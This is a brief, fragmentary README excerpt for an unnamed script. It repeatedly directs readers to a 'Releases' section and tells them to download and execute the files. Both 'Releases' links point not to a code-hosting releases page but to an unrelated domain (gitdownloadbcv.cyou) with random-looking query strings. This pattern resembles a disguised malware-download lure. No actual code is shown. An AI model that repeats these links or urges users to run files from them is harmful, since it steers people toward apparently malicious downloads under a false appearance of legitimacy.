...
1. **Download the Script**: Visit the [Releases](https://gitdownloadbcv.cyou?mj6q99bytcm3vke) section to download the latest version of the script.
...
For the latest updates and downloads, check out the [Releases](https://gitdownloadbcv.cyou?iuujqngagypishh) section. Download the necessary files and execute them to start using the script.
